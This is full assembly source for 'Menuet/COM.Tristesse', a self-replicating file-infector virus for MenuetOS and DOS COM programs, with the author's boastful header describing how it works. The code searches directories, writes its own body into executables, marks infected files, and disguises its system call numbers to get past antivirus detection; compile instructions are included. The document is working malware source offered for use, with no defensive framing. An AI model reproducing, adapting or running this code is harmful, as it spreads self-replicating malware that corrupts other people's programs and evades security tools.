;;  Menuet/COM.Tristesse
;;  by Second Part To Hell/[rRlf]
;;  www.spth.de.vu
;;  spth@prist.com
;;  written from june 2004 - sebtember 2004
;;  in Austria
;;
;;  I'm damn proud that I can present you my latest virus: Menuet/COM.Tristesse!
;;  So far, this is the most complex virus I've ever coded, and you'll get the
;;  point, why it is the most complex while reading this.
;;
;;
;;  The virus:
;;  Menuet/COM.Tristesse is a multi-platform infector, which infects MENUETs/COMs.
;;  MENUET (www.menuetos.org) files will be infected via prepending the code and COM files will
;;  be infected via appending the code. The most important thing about this virus was the
;;  biggest (!!!) problem while coding:
;;  Menuet is a 32bit based OS, and COM files uses 16bits, which means that I had to code
;;  two totally independent parts, one for MENUETs (32bit) and one for COMs (16bit). (I can
;;  tell you, infecting a 32bit file via a 16bit file is hell.)
;;
;;  The virus infects files this way:
;;  Menuet (32bit) -> Menuet (32bit - prepending)
;;  Menuet (32bit) -> COM (16bit - appending)
;;  COM (16bit) -> COM (16bit - appending)
;;  COM (16bit) -> Menuet (32bit - prepending)  
;;
;;  When the virus runs at MenuetOS, the following thing happens:
;;    - Searchs and infects MENUETs at the RAMDISK
;;    - Searchs and infects COMs at the HARDDISK (which is, in most cases C:\)
;;    - Regenerates the host and returns to the host
;;
;;    More exactly: The virus does the following things:
;;      - Searchs it's code (delta offset via static address)
;;      - Searchs for files
;;      - Checks if the file is good for infection (MENUET file, not infected, enough memory, ...)
;;      - Reads file into memory
;;      - Writes first hostbytes (buffer for virus) to end of file in memory
;;      - Viruscode in memory at buffer generated before
;;      - Writes Infection sign
;;      - Saves file at RAMDISK
;;           - Jmp to 2
;;      - Searchs for files
;;      - Checks if the file is good for infection (COM file, not infected, no MZ header, ...)
;;      - Reads file into memory
;;      - Saves first 4 bytes
;;      - Generates jump to virus + infection mark
;;      - Appends viruscode to end of file in memory
;;      - Saves file at HARDDISK
;;      - Writes Host at Entry Point of file
;;           - Jmp to 10
;;      - Return to host
;;
;;
;;
;;  When the virus runs at COMs, the following happens:
;;    - Searchs and infects COMs at current directory
;;    - Searchs and infects MENUETs at current directory
;;    - Regenerates the host and retuns to the host
;;
;;    More exactly: The virus does the following things:
;;      - Searchs it's code (delta offset via call)
;;      - Restore host (4 bytes at the start)
;;      - Find First File (*.com)
;;      - Open File
;;      - Checks if the file is good for infection (no MZ header, not infected)
;;      - Save 4 bytes and check if it's already infected
;;      - Calculates new Offset for Jump (filesize+MENUET part-3 bytes [jmp])
;;      - Appends viruscode to the end of the file
;;      - Writes new 4 bytes (jmp+Virussign)
;;      - Find Next File
;;           - Jmp to 2
;;      - Find First File (*.*)
;;      - Open file
;;      - Check if the file is good for infection (MENUET file, not infected)
;;      - Calculate n blocks (1 block=0x10 bytes) and REST of hostcode
;;      - Writes first hostbytes (buffer for virus) to end of file
;;      - Writes Virus to generated buffer
;;           - Jmp to 11
;;      - Return to host
;;
;;
;;  Some other infos:
;;    1.) You may ask, why did I infect COM files instead of PE EXEs. The answere is simple:
;;        You can not infect PE EXEs via MENUET, because there if too few memory for reading
;;        the file. And COMs should just contain 65.536 bytes.
;;
;;    2.) The virus conains a by-hand encryption of DOS SYSTEM CALL NUMBERS, for avoiding
;;        KAVs 'Type_COM' warning. Every Number is encrypted with one of XOR/NOT/ADD/SUB/INC/DEC.
;;
;;    3.) I've tested the virus at WindowsXP, Windows98, MenuetOS 0.78 pre2 and MenuetOS 0.77 final,
;;        and the code worked on every OS. There is just one problem with MenuetOS 0.76+ when you
;;        run it with a Notebook/Laptop. Menuet can't read data from the HARDDISK, and therefore
;;        just MENUET files will be infected, not COMs. But this is a bug in Menuet, and not in my
;;        virus.
;;
;; Compile: FASM code.asm code
;;          And you get the executeable MENUET file.
;;          You will get the COM infected, when a MENUET file infects a COM, not with compiling.
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;





	viruslength	equ I_END-START

use32
   
 		org     0x0
   
		db      'MENUET00'		; 8 byte id
		dd      23			; required os & Virus infection Mark
		dd      START			; Program start
		dd      I_END			; Program length
		dd      0x100000		; Required amount of memory
		dd      0x00000000		; reserved=no extended header

START:
	pushad					; Save the original register-contents to stack
	mov	ebp, dword [0xC]		; Save the virussize in ebp


;;	Infect MENUET-files

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to fileinfo-block
	add	bx, (dir_block_men-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, 0x20000			; Move Offset of filename to ebx

nextfile:
	add	ebx, 32				; Next Filename

	cmp	ebx, 0x22000			; Compair ebx with 0x22000
	je	endinfmen			; If equal, stop it

	mov	cl, [ebx]			; First letter of Filename to cl
	cmp	cl, 0xE5			; Compair with 0xE5 (which is the sign of a DELETED file)
	je	nextfile			; If so, get next file

	mov	cl, [ebx+11]			; Move the attribute bits to cl
	and	cl, 0x10			; AND 0x10 ( ???1 ???? = FOLDER )
	jnz	nextfile			; If not zero, get next file

	mov	edx, ebx			; Save ebx in edx
	mov	edi, ebp			; Move fle (11 letter buffer) to edi
	add	di, (fle-START)			; Get the relative Offset

	xor	ecx, ecx			; ecx=0
	mov	cl, 11				; Move 11 to ecx (counter=11)
   fn2fb:					; File Name to File Block
	mov	al, [ebx]			; Move the ebx-value to al
	stosb					; Write al to memory at offset edi (=11 letter buffer)
	inc	ebx				; Get next letter
   loop	fn2fb					; Jump to fn2fb if ecx>0 && dec ecx

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_men-START)	; Get the relative Offset
	int	0x40				; System Call
	mov	ebx, edx			; Restore original ebx (Filename offset)

	mov	eax, 0x25000			; Move Offset of readed file-content to eax
	cmp	dword [eax], 'MENU'		; Compair a double-word with 'MENU'
	jne	nextfile			; If not equal (=No Menuet-executed file), get next file

	add	al, 8				; eax = 0x25000 + 0x8 = Infection mark offset
	cmp	byte [eax], 23			; Compair a byte with 23
	je	nextfile			; If equal (file is already infected), get next file

	add	al, 12				; eax= 0x25008+12 = Memory used by file
	cmp	dword [eax], 0x50000		; Compaire with 0x50000 (most files have the double)
	jl	nextfile			; If less (too few memory for the virus), get next file

	mov	eax, dword [ebx+28]		; Move the filesize to eax
	shr	eax, 9				; Get the blocks to read
	inc	eax				; For reading the last not completed block

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative Offset
	stosb					; Write [al] to di in memory

	mov	edx, ebx			; Save ebx to edx
	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_men-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, edx			; Restore original ebx (Filename offset)


;;	Write first part (bytes of virus) of the host code to end
;;	because these bytes will be overwritten.

	mov	edi, dword [0x25010]		; Where to write: End of file
	add	edi, 0x25000			; Add memory offset of hostcode

	mov	cx, viruslength			; Viruslength to ecx
	add	ecx, dword [0x2500C]		; add Header-length
	cmp	dword [0x25010], ecx		; Check if the file is smaller than the virus

	jge	notsmall			; If not greater or equal, calculate another offset for writing

	xchg	edi, ecx			; Move the real start to edi
	add	edi, 0x25000			; Add memory offset

 notsmall:
	xor	ecx, ecx			; ecx=0
	mov	cx, viruslength			; How much to read: Viruslength

	mov	edx, dword [0x2500C]		; What to read: Entry Point of file
	add	edx, 0x25000			; Add memory offset of hostcode

   fp2eof:					; First part to end of file
	mov	al, [edx]			; Move a victim code's byte to al
	stosb					; Write al to memory at offset edi (end of file)
	inc	edx				; Get next byte
   loop fp2eof					; Jump to fp2eof if ecx>0 && dec ecx


;;	Overwrite first part of host file with viruscode

	mov	cx, viruslength			; How much to write: Virus length
	mov	edx, ebp			; What to write: Viruscode

	mov	edi, dword [0x2500C]		; Where to write: Entry Point of file
	add	edi, 0x25000			; Add memory offset of hostcode

   vc2vm:					; Virus code to victim memory
	mov	al, [edx]			; Move a virus code's byte to al
	stosb					; Write al to memory at offset edi (Start of victim's code)
	inc	edx				; Get next virus byte
   loop vc2vm					; Jump to vc2vm if ecx>0 && dec ecx


;;	Infection Mark  <-- Against double-infection

	mov	edi, 0x25008			; Move the point of the infection sign
	mov	al, 23				; What to write (the infection mark)
	stosb					; Write infection mark to file

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative Offset
	mov	eax, dword [ebx+28]		; What to write (Old Filesize)
	add	eax, viruslength		; Add virussize
	stosd					; Write eax to memory at offset edi


;;	Write memory with new built infected file to RAMDISK

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_kd-START)		; Get the relative Offset
	mov	al, 1				; What to write (1 for writing)
	stosb					; Write al to memory at offset edi

	mov	edx, ebx			; Save ebx to edx

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file_block_men
	add	bx, (file_block_men-START)	; Get the relative Offset
	int	0x40				; System Call


;;	Restore some memory stuff and register

	mov	ebx, edx			; Restore ebx

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_kd-START)		; Get the relative offset
	xor	al, al				; What to write (0 for reading) = RESTORING
	stosb					; Write al to memory at offset edi

	mov	edi, ebp			; Move the offset where to write
	add	di, (flb_bs-START)		; Get the relative offset
	inc	al				; What to write = RESTORING
	stosb					; Write al to memory at offset edi

	jmp	nextfile			; Get Next File

endinfmen:

;;	Infect COM-files

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to fileinfo-block
	add	bx, (dir_block_com-START)	; Get the relative offset
	int	0x40				; System Call

	mov	ebx, 0x20000			; Move Offset of filename to ebx

men_com_nextfile:
	add	ebx, 32				; Find next file

	cmp	ebx, 0x22000			; Compair ebx with 0x22000
	je	endinfcom			; If equal, stop it

	mov	cl, [ebx]			; First letter of Filename to cl
	cmp	cl, 0xE5			; Compair with 0xE5 (which is the sign of a DELETED file)
	je	men_com_nextfile		; If so, get next file

	mov	cl, [ebx+11]			; Move the attribute bits to cl
	and	cl, 0x10			; AND 0x10 ( ???1 ???? = FOLDER )
	jnz	men_com_nextfile		; If not zero, get next file

	mov	ax, [ebx+8]			; Move first 2 bytes of file-extansion to ax
	cmp	ax, 'CO'			; Check if it's a COM-file
	jne	men_com_nextfile		; If not equal, get next file

	mov	edx, ebx			; Save ebx in edx
	mov	edi, ebp			; Move fle (11 letter buffer) to edi
	add	di, (c_fle-START)		; Get the relative Offset

	xor	ecx, ecx			; ecx=0
	mov	cl, 11				; Move 11 to ecx (counter=11)
   c_fn2fb:					; File Name to File Block
	mov	al, [ebx]			; Move the ebx-value to al
	stosb					; Write al to memory at offset edi (=11 letter buffer)
	inc	ebx				; Get next letter
   loop	c_fn2fb					; Jump to fn2fb if ecx>0 && dec ecx

	mov	eax, dword [edx+0x1C]		; Move the filesize to eax
	shr	eax, 9				; Get the blocks to read
	inc	eax				; For reading the last not completed block

	mov	edi, ebp			; Move the offset where to write
	add	di, (c_flb_bs-START)		; Get the relative Offset
	stosb					; Write [al] to di in memory

	xor	eax, eax			; eax=0
	mov	al, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; pointer to file-block
	add	bx, (file_block_com-START)	; Get the relative Offset
	int	0x40				; System Call

	mov	ebx, edx			; Restore ebx

	mov	ax, word [0x25000]		; Move first two bytes to ax
	cmp	ax, 'MZ'			; Check if it's a pseudo-COM
	je	men_com_nextfile		; If equal, get next file

	mov	al, [0x25003]			; Move the 4th byte to al
	cmp	al, 'S'				; Check if it's infected
	je	men_com_nextfile		; If equal, get next file

	mov	eax, dword [0x25000]		; Move first 4 bytes of .COM to eax
	mov	edi, ebp			; Move the offset where to save the 4 bytes
	add	edi, (com_rest_bytes-START)	; Get relative offset
	stosd					; Write eax to offset edi

	mov	eax, [edx+0x1C]			; Filesize to eax
	add	ax, (comvirusstart-START-3)	; Add offset of com-part start (Size shouldn't be bigger than 0xFFFF)
	mov	edi, ebp			; Where to write
	add	edi, (com_4bytes-START+1)	; Buffer for com-start
	stosw					; Write two bytes

	mov	edi, [edx+0x1C]			; Move the filesize to eax
	add	edi, 0x25000			; Get the end of the file
	mov	ecx, viruslength		; Move viruslength to ecx
	mov	ebx, [0xC]			; Move the start of the virus to ebx

   c_vir2end:					; Virus to end
	mov	al, [ebx]			; Move one virusbyte to al
	stosb					; Write al to edi
	inc	ebx				; Get next byte
   loop c_vir2end				; Write next byte

	mov	ebx, ebp			; 4 bytes to ebx (Jmp to com + infection mark)
	add	ebx, (com_4bytes-START)		; Get relative offset
	mov	edi, 0x25000			; Where to write: filestart
	mov	ecx, 0x4			; Write 4 bytes

   c_4b2fRAM:					; 4 bytes to file in RAM
	mov	al, [ebx]			; Move one of the 4 bytes to al
	stosb					; Write al to edi
	inc	ebx				; Get next byte
   loop c_4b2fRAM				; Write next byte

	mov	al, 0x1				; Move 1 to al
	mov	edi, ebp			; Move com-fileblock offset to edi
	add	edi, (c_flb_kd-START)		; Get relative offset
	stosb					; Modify com-fileblock (to write)

	mov	eax, dword [edx+0x1C]		; Move filesize to eax
	add	eax, viruslength		; Add viruslength
	mov	edi, ebp			; Move com_fileblock offset to edi
	add	edi, (c_flb_bs-START)		; Get relative offset
	stosd					; Modify com-fileblock (size to write)

	mov	eax, 58				; SYSTEM TREE ACCESS
	mov	ebx, ebp			; Fileblock
	add	ebx, (file_block_com-START)	; Get relative offset
	int	0x40				; SYSTEM CALL

	mov	ebx, edx			; Restore Filenames

   jmp	men_com_nextfile			; Get Next File

endinfcom:

;;	Restore original host

	mov	ebx, ebp			; What to write - Offset of vircode
	add	bx, (rebu-START)		; Add relative address

	mov	edi, 0x20000			; Where to write
	mov	cl, (rebuend-rebu)		; How much to write (whole rebuild-code)

   rb2m:					; Rebuild code to memory
	mov	al, [ebx]			; Move one byte of rebuild-code to al
	stosb					; Write al to offset edi
	inc	ebx				; Get next byte
   loop rb2m					; Jump to rbch if ecx>0 && inc ecx

	mov	ebx, 0x20000
	jmp	ebx				; Jump to rebuild code in memory
						; Now the viruscode in memory will be replaced by the
						; old original host code, and the control comes back to
						; the host file. The reason for using memory for
						; overwrite the viruscode in memory is the fact that
						; we can't overwrite the current running code.



						; From now on, there is just data





 rebu:						; Rebuild the host code
	xor	eax, eax			; eax=0
	mov	al, 0x10			; eax=0x10
	mov	ebx, dword [eax]		; Move the file length to ebx, to get the old hostcode offset

	sub	eax, 4				; eax=0xC

	mov	edx, dword [eax]		; Move the offset of the head-length to edx
	add	dx, viruslength			; Add the virulength to edx

	cmp	ebx, edx			; Check if the file is smaller than the virus
	jge	notsmall2			; If not greater or equal, go on

	mov	ebx, edx			; Move the new offset to ebx

 notsmall2:

	mov	edi, dword [0xC]		; Where to write: 0xC
	mov	cx, viruslength			; How much to write


     rbhc:					; Rebuild host code
	mov	al, [ebx]			; One byte of the saved host code to al
	stosb					; Write al (Host code) to edi (Entry Point of file)
	inc	ebx				; Get next byte
     loop rbhc					; Jump to rbch if ecx>0 && inc ecx

	popad					; Get the original register-contents

	jmp	dword [0xC]			; Jump to Entry Point, now with the original code
 rebuend:					; Rebuild host code: End



;;
;;	DATA
;;


	virmsg	db '1st Menuet/COM Virus (Tristesse) by Second Part To Hell/rRlf'


dir_block_men:
	dd 0					; 0=READ
	dd 0x0					; 512 block to read 0+
	dd 0x16					; blocks to read (/bytes to write/append)
	dd 0x20000				; return data pointer
	dd 0x10000				; work area for os - 16384 bytes
	db '/RD/1',0				; ASCIIZ dir & filename

file_block_men:
flb_kd: dd   0					; 0=READ    (delete/append)
	dd   0x0				; 512 block to read 0+
flb_bs: dd   0x1				; blocks to read (/bytes to write/append)
	dd   0x25000				; return data pointer
	dd   0x10000				; work area for os - 16384 bytes
flpath	db '/RD/1/'
fle	db '           ',0

dir_block_com:
	dd 0					; 0=READ
	dd 0x0					; 512 block to read 0+
	dd 0x16					; blocks to read (/bytes to write/append)
	dd 0x20000				; return data pointer
	dd 0x10000				; work area for os - 16384 bytes
	db '/HD/1',0				; ASCIIZ dir & filename

file_block_com:
c_flb_kd: 	dd   0				; 0=READ    (delete/append)
		dd   0x0			; 512 block to read 0+
c_flb_bs:	dd   0x1			; blocks to read (/bytes to write/append)
		dd   0x25000			; return data pointer
		dd   0x10000			; work area for os - 16384 bytes
c_flpath	db '/HD/1/'
c_fle		db '           ',0

;;	Start of the COM-part
;;
	use16

comvirusstart:					; Start of the virus
	call com_get_delta			; Jump to com_get_delta + push current offset


com_get_delta:  
	pop	bp				; Get current offset
	sub	bp, com_get_delta		; Get relative offset

	lea	si, [bp+com_rest_bytes]		; Restore original bytes from com_rest_bytes
	mov	di, 0x100			; Write to 0x100, as a COM starts at that offset
	movsw					; Write 2 bytes
	movsw					; Write 2 bytes (=4 bytes)

com_find_first:
	mov	ah, 0xB1			; Find First File (encrypted)
	xor	ah, 0xFF			; Decrypt

com_infection:
	lea	dx, [bp+com_string]		; dx=Search-lable (='*.com')
	xor	cx, cx				; cx=Attribute (=normal file)
	int	0x21      			; Execute It

	jc	end_vir             	  	  ; If carry (no more file), jmp to end of virus

	mov	ax, 0xC2FD      	        ; Open File (encrypted)
	xor	ax, 0xFFFF			; Decrypt
	mov	dx, 0x9E			; dx=Filename (any com-file returned by FFF)
	int	0x21				; Execute it

	xchg	ax, bx				; Filehandle to bx

	mov	ah, 0xC0			; Save first 4 bytes, which will be overwritten (jmp + infection-mark) (encrypted)
	xor	ah, 0xFF			; Decrypt
	mov	cx, 0x4				; cx= How much (4 bytes)
	lea	dx, [bp+com_rest_bytes]		; Where to save (4 byte-buffer)
	int	0x21				; Execute it

	cmp	byte [bp+com_rest_bytes+3], 'S'	; Check if already infected
	je	com_FindNextFile		; If equal (=infected), jump com_FindNextFile

	mov	ax, 0xBDFD			; Jump to end of the file (+ Get filesize) (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	add	ax, (comvirusstart-START-3)	; Calculate the offset of new com-start: filesize+MENUET part-jmp(3 bytes)
	mov	word [bp+com_4bytes+1], ax	; Write the new length to the buffer,
						; so the file will jump to the end (=virus-start)

	mov	ah, 0x45			; Write to file (encrypted)
	sub	ah, 0x5				; Decrypt
	mov	cx, viruslength			; How much to write (virussize)
	lea	dx, [bp+START]			; Where to read from: virusstart
	int	0x21 				; Execute it

	mov	ax, 0xBDFF			; Get the filestart (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xBF			; Write to file (encrypted)
	xor	ah, 0xFF			; Decrypt
	mov	cx, 0x4				; How much to write: 4 bytes= jmp+infection_mark
	lea	dx, [bp+com_4bytes]		; Where to read
	int	0x21				; Execute it

com_FindNextFile:
	mov	ah, 0xC1			; Close file (encrypted)
	not	ah				; Decrypt
	int	0x21				; Execute it

	mov	ah, 0x6D			; Find Next File (encrypted)
	xor	ah, 0xDD			; Decrypt
	not	ah				; Decrypt
	jmp	com_infection			; Infect it

end_vir:
	mov	ah, 0xB1			; Find First File (encrypted)
	not	ah				; Decrypt

c_men_infection:
	lea	dx, [bp+com_men_string]		; dx=Search-lable (='*.*')
	xor	cx, cx				; cx=Attribute (=normal file)
	int	0x21      			; Execute It

	jc	ret_host			; If carry (no more file), jmp ret_host
	
	mov	ax, 0xC2FD			; Open file (encrypted)
	xor	ax, 0xFFFF			; Decrypt

	mov	dx, 0x9E			; dx=Filename (any file returned by FFF)
	int	0x21				; Execute It

	xchg	ax, bx				; Filehandle to bx

	mov	ah, 0x28			; Read from file (encrypted)
	xor	ah, 0x17			; Decrypt

	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer1]	; Where to store (Menuet buffer)
	int	0x21				; Execute it

	cmp	word [bp+com_men_buffer1], 'ME'	; Check if it's a Menuet-File
	jne	com_men_FNF			; If not, get next file

	cmp	byte [bp+com_men_buffer1+0x8], 0x17	; Check if file is already infected
	je	com_men_FNF				; If equal (=infected), get next file

	mov	ax, 0x4210			; Set File Pointer to start (encrypted)
	sub	ax, 0x10			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xC0			; Read from file (encrypted)
	not	ah				; Decrypt
	mov	cx, 0x8				; How much to read
	mov	dx, [bp+com_men_buffer1]	; Where to store
	int	0x21				; Execute it

	mov	ah, 0x63				; Write to file (encrypted)
	xor	ah, 0x23				; Decrypt
	mov	cx, 0x1					; How much to write: One byte
	mov	byte [bp+com_men_buffer1], 0x17		; The Infection Mark to the buffer
	lea	dx, [bp+com_men_buffer1]		; What to write: Infection Mark for MENUETs
	int	0x21					; Execute it

	mov	ax, 0x3200			; Set File Pointer to start (encrypted)
	add	ax, 0x1000			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0x30			; Read from file (encrypted)
	add	ah, 0xF				; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	mov	dx, [bp+com_men_buffer1]	; Where to store
	int	0x21				; Execute it

	mov	ax, viruslength			; Move viruslength to ax
	shr	ax, 0x4				; 4 bytes left: ax*16=viruslength + REST
	mov	di, ax				; Save result in di

	mov	dx, 0x10			; dx=0x10
	mul	dx				; ax=dx[0x10]*ax[shr(viruslength)4]

	mov	dx, ax				; Get the result to dx
	mov	ax, viruslength			; Move viruslength to ax
	sub	ax, dx				; viruslength-di[shr(viruslength)*16]=REST
	push	ax				; Save REST to stack

	mov	ax, [bp+com_men_buffer1+0xC]	; Move the offset of the EP to ax
	push	ax				; Offset of the EP to the stack

	mov	ax, 0x4202			; Get filelength (=Set filepointer to end of file)
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	sub	ax, [bp+com_men_buffer1+0xC]	; Sub header-length to get real code-length
	cmp	ax, viruslength			; Compair codelength with viruslength
	jge	com_menfi_ge			; If greater or equal jmp to com_menfi_ge

	mov	di, ax				; Move the real codelength to di

   com_men_st2end2:				; MENUET Start to End
	mov	ax, 0xBDFF			; Set File Pointer to start (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x4203			; Set File Pointer (encrypted)
	dec	ax				; Decrypt
	dec	ax				; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	push	dx				; dx to the stack again
	int	0x21				; Execute it

	pop	dx				; Get offset where to read from stack to dx
	add	dx, 0x10			; Add 16 to dx (As we need the next 16 bytes)
	push	dx				; To the stack again

	mov	ah, 0x4F			; Read from file (encrypted)
	sub	ah, 0x10			; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0xE8AA			; Set File Pointer to start (encrypted)
	xor	ax, 0xAAAA			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x9FDC			; Set file Pointer (encrypted)
	xor	ax, 0xDDDD			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=EP+already read bytes
	push	dx				; Save dx again
	add	dx, viruslength-0x10		; Add viruslength-16 (previous 16 bytes) to dx: dx=offset to write old host code
	int	0x21				; Execute it

     com_nrestbytes:
	mov	ah, 0x60			; Write to file (encrypted)
	sub	ah, 0x20			; Decrypt
	mov	cx, 0x10			; How much to write: 16 byte
	lea	dx, [bp+com_men_buffer2]	; What to write: First bytes of file for buffer
	int	0x21				; Execute it

	sub	di, 0x10			; Decrease di
	cmp	di, 0x10			; Compair di with 16
	jge	com_men_st2end2			; If not zero (still 16byte blocks to copy), jmp to com_men_st2end2

	mov	ax, 0x42FF			; Set File Pointer to start (encrypted)
	sub	ax, 0xFF			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x1				; Set File Pointer (encrypted)
	add	ax, 0x4200			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	int	0x21				; Execute it

	mov	ah, 0xA6			; Read from file (encrypted)
	xor	ah, 0x99			; Decrypt
	mov	cx, di				; How much to read (REST)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0xBDFD			; Set File Pointer to end (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xBF			; Write to file (encrypted)
	not	ah				; Decrypt
	mov	cx, di				; How much to write (REST)
	lea	dx, [bp+com_men_buffer2]	; What to write: Rest of bytes
	int	0x21				; Execute it

	pop	ax				; Pop trash
	jmp	virinclude			; Jump to Virus-Include-Part

com_menfi_ge:
   com_men_st2end:
	mov	ah, 0x42			; Set File Pointer to start (encrypted)
	xor	al, al				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x4200			; Set File Pointer (encrypted)
	inc	al				; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	push	dx				; dx to the stack again
	int	0x21				; Execute it

	pop	dx				; Get offset where to read from stack to dx
	add	dx, 0x10			; Add 16 to dx (As we need the next 16 bytes)
	push	dx				; To the stack again

	mov	ah, 0x30			; Read from file (encrypted)
	add	ah, 0xF				; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0x4002			; Set File Pointer to end (encrypted)
	add	ax, 0x200			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0x25			; Write to file (encrypted)
	add	ah, 0x1B			; Decrypt
	mov	cx, 0x10			; How much to write: 16 byte
	lea	dx, [bp+com_men_buffer2]	; What to write: First bytes of file for buffer
	int	0x21				; Execute it

	dec	di				; Decrease di
	test	di, di				; test di if zero
   jnz	com_men_st2end				; If not zero, write next 16 byte

	mov	ax, 0x2200			; Set File Pointer to start (encrypted)
	add	ax, 0x2000			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x6201			; Set File Pointer (encrypted)
	sub	ax, 0x2000			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	int	0x21				; Execute it

	mov	ah, 0x20			; Read from file (encrypted)
	add	ah, 0x1F			; Decrypt
	pop	cx				; Get REST
	push	cx				; Save REST again
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	xor	ax, ax				; Set File Pointer to end (encrypted)
	add	ax, 0x4202			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xFB			; Write to file (encrypted)
	xor	ah, 0xBB			; Decrypt
	pop	cx				; How much to write: REST bytes
	lea	dx, [bp+com_men_buffer2]	; What to write: REST bytes
	int	0x21				; Execute it

virinclude:					; Virus-Include-Part
	mov	ax, 0xBDFF			; Set File Pointer to start (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0xBDFE			; Set File Pointer (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	mov	dx, [bp+com_men_buffer1+0xC]	; destination: Entry Point
	int	0x21				; Execute it

	mov	ah, 0x53			; Write to file (encrypted)
	xor	ah, 0x13			; Decrypt
	mov	cx, viruslength			; How much to write: Viruslength
	mov	dx, bp				; What to write: Viruscode
	add	dx, START			; Get relative offset
	int	0x21				; Execute it

com_men_FNF:
	mov	ah, 0xD0			; Close file (encrypted)
	xor	ah, 0xEE			; Decrypt
	int	0x21				; Execute it

	mov	ah, 0xA1			; Find Next File (encrypted)
	xor	ah, 0xEE			; Decrypt
	jmp	c_men_infection			; Infect it

ret_host:


	mov	di, 0x200			; di=0x100 (as it's a COM-file) (encrypted)
	sub	di, 0x100			; Decrypt
	jmp	di				; Jump to di (Jump to Host-start)


	com_men_string	db '*.*',0		; FileMask for MENUETs
	com_string	db '*.com',0		; FileMask for COMs
	com_men_buffer1: times 0x10 db 0x0	; 16 byte buffer for Menuet-Sign
	com_men_buffer2: times 0x10 db 0x0	; 16 byte buffer for Saving the Hostfile
	com_4bytes	db 0xE9, 0x0, 0x0 ,'S'	; Jmp to virus + Infection Mark
	com_rest_bytes	db 0xCD, 0x20, 0x90, 0x90	; 1st Generation only: int 0x20 | NOP | NOP

end_virus:                     ;ENDE
I_END: